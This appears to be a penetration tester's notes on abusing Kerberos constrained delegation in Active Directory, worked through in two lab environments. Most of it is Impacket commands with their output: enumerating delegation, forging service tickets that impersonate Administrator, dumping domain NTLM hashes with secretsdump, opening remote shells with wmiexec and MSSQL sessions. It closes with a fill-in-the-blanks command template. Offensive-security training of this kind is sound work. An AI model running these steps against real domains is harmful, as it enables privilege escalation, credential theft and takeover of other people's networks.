**Constrained Delegation** is a security feature in Active Directory environments where an attacker targets specific services. It works by allowing a service to impersonate users, but only to access predefined services using their Kerberos tickets (TGS—Ticket Granting Service).
### CIF/SMB Example:
#### Enumeration

Impacket:

```bash
findDelegation.py domain.local/username:password -target-domain domain.local
```

![[Pasted image 20240816142743.png]]
#### Bloodhound

![[Pasted image 20240816150123.png]]
#### The Attack

Get TGS for the impersonated user:

```bash
getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

Set environment variable for Kerberos cached credential file:

```bash
export KRB5CCNAME=./Administrator.ccache
```

Verify:

```bash
klist
Ticket cache: FILE:./Administrator.ccache
Default principal: Administrator@north.sevenkingdoms.local

Valid starting     Expires            Service principal
16/08/24 14:28:20  17/08/24 00:28:20  CIFS/winterfell@NORTH.SEVENKINGDOMS.LOCAL
```

Dump Password Hashes:

```bash
secretsdump.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell -just-dc-ntlm
```

Or log into the DC

```bash
wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell
```

### MSSQL Example:

Same as above but targeting the SQL service:

![[Pasted image 20250612212721.png]]

```bash
garffff@garffff:~$ findDelegation.py tengu.vl/t2_m.winters:Tengu123
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

AccountName  AccountType                          DelegationType                      DelegationRightsTo         
-----------  -----------------------------------  ----------------------------------  --------------------------
gMSA01$      ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  MSSQLSvc/SQL:1433          
gMSA01$      ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  MSSQLSvc/sql.tengu.vl:1433 
gMSA01$      ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  MSSQLSvc/sql.tengu.vl      
gMSA01$      ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  MSSQLSvc/sql               



garffff@garffff:~$ getST.py -spn 'MSSQLSvc/sql.tengu.vl:1433' -impersonate T1_M.WINTERS -dc-ip 10.10.139.133 'tengu.vl/gMSA01$' -hashes :7c6ef6686428a349676d1c1b76a9ca53
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating T1_M.WINTERS
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in T1_M.WINTERS.ccache

garffff@garffff:~$ export KRB5CCNAME=T1_M.WINTERS.ccache 

garffff@garffff:~$ klist
Ticket cache: FILE:T1_M.WINTERS.ccache
Default principal: T1_M.WINTERS@tengu.vl

Valid starting     Expires            Service principal
12/06/25 21:29:38  13/06/25 07:29:38  MSSQLSvc/sql.tengu.vl:1433@TENGU.VL
	renew until 13/06/25 21:29:38
	
garffff@garffff:~$ mssqlclient.py tengu.vl/T1_M.WINTERS@sql.tengu.vl -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed database context to 'master'.
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL> 
```

# Note:

Accounts in the `protected users` group cannot be impersonated
### Summary

```bash
findDelegation.py <domain>/<user1>:<pass1>

getST.py -spn '<delegate>' -impersonate <user2> -dc-ip <dc_ip> '<domain>/<delegate_user>:<delegate_pass>' {-hashes :<delegate_hash>}

export KRB5CCNAME=<user2>.ccache

mssqlclient.py tengu.vl/<user2>@<target_dns> -k -no-pass
```